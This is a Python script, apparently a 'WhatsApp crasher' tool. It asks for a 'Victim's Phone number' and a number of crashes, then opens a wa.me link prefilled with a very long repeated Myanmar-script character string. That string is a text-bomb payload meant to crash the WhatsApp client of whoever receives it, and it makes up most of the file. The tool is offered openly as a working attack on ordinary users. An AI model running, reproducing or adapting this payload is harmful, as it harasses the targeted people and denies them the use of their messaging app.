import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")
logo = f"""
{Y} __________________________________________________________________________________________
{G}                                                                            /$$         {G}|
                                                                           | $$         {G}|
       /$$  /$$  /$$  /$$$$$$         /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$$$$$$    {R}|
      | $$ | $$ | $$ |____  $$       /$$_____/ /$$__  $$|____  $$ /$$_____/| $$__  $$   {R}|
      | $$ | $$ | $$  /$$$$$$$      | $$      | $$  \__/ /$$$$$$$|  $$$$$$ | $$  \ $$   {R}|
      | $$ | $$ | $$ /$$__  $$      | $$      | $$      /$$__  $$ \____  $$| $$  | $$   {G}|
      |  $$$$$/$$$$/|  $$$$$$$      |  $$$$$$$| $$     |  $$$$$$$ /$$$$$$$/| $$  | $$   {G}|
       \_____/\___/  \_______/       \_______/|__/      \_______/|_______/ |__/  |__/   {G}|
                                                                                        {G}|
{G}             ⠀⢰⣶⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣦⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{G} ⢀⣸⣿⣧⣀⣀⣀⣀⣠⡾⣿⠿⠿⣿⣿⣿⣿⣶⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣟⣻⣛⣛⣿⣻⣿⣛⣛⣛⣻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{R}⠘⠻⢿⡿⠟⠛⠿⠿⠿⠷⠟⠓⠛⠛⢿⣿⣿⣿⣿⣧⣼⣿⣤⣾⣟⣿⣿⣿⣿⠿⣿⣿⣛⣻⣿⣿⡛⢛⡿⢿⠿⢿⠿⣿⣿⣿⣶⣶⡤⣴⠒⠒⠶⠤⠤⣄⣀⣀⣀⠀⠀
{R}⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠛⠏⠉⠉⠙⣿⣟⣿⣿⣿⣿⡟⠛⢻⣿⣿⣷⣾⣿⡿⠿⣿⣿⣿⠿⢾⢉⠁⠐⠂⣲⡀⢤⣤⢩⣹⣇  {W} CARL24TECH
{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠋⠿⠳⠤⠯⠼⢿⣭⣿⢿⠁⠀⠀⠉⠙⠳⠷⣦⣤⣤⣬⣙⠛⠲⠾⣶⣿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠈⢿⡙⣌⣧⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣿⣦⣴⣶⣾⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠹⣼⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

{Y}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{Y}|{R} █░█ ▄▀█  █▀▀ █▀█ ▄▀█ █▀ █░█ █▀▀ █▀█ {Y}|
{Y}|{G} █▀█ █▀█  █▄▄ █▀▄ █▀█ ▄█ █▀█ ██▄ █▀▄ {Y}|
{Y}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  v.1.0
  BY BONITOMINATI AND CARL24TECH                                   
"""
def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'{G}[{Y}+{G}]{M} Enter Country Code WithOut "+" eg.91 {C}=> '))
	print()
	num=input(f"{G}[{Y}+{G}]{M} Enter the Victim's Phone number\n\n{C}=> {cncode}  ")
	print()
	crash=int(input(f'{G}[{Y}+{G}]{M} Enter the number of crashes {W}(Max 15 per 30min) \n\n{C}=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"{G}[{Y}+{G}]{M}Crashing Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open https://wa.me/{combnum}/?text=န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.ේ.0.န.0.ါ.0.⚛፝͜͡๖ۣۜČФP๋ቾẲÐФŘ፝͜͡๖ۣ➳࿇፝͜͡๖